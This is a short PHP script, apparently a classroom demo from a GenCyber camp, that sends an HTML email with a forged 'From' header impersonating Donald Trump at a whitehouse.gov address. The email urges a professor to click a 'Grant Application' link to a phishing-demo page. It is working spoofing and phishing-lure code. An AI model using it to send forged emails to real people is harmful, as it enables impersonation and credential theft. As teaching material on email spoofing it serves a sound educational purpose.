# Warning! This script will send out spoofed emails.
# Spoofing emails for purposes other than education is punishable as a crime.
# Please read and agree top the ethics statement before using this script.
# This script was used for the Gencyber Camp
# There is nothing in this script that you cannot find with a simple Google search.

<?php
$email   = 'smartprof@unomaha.edu';
$subject = 'Make Cybersecurity Great Again!';
$headers = "From: Donald Trump <therealdonaldtrump@whitehouse.gov>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$message  = '<html>';
$message .= '<head>';
$message .= '<meta http-equiv="Content-Type" content="text/html; charset=us-ascii">';
$message .= '</head>';
$message .= '<body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;" class="">';
$message .= 'Dear Dr. Gandhi,<br class="">';
$message .= '<br class="">';
$message .= 'You are doing very very good work with the Gencyber Camp.&nbsp;<br class="">';
$message .= 'Just let me know what you need to make it bigly successful next year!<br class="">';
$message .= 'Please put in your funding request here:&nbsp;';
$message .= '<a href="http://faculty.ist.unomaha.edu/rgandhi/phishing-demo/encoding.html" class="">Grant Application</a>';
$message .= '<br class=""> <br class="">';
$message .= '<div class="">~Yours Truly<br class="">';
$message .= '<font color="#ff2600" class="">Donald</font></div>';
$message .= '</body></html>';
mail($email, $subject, $message, $headers);
?>
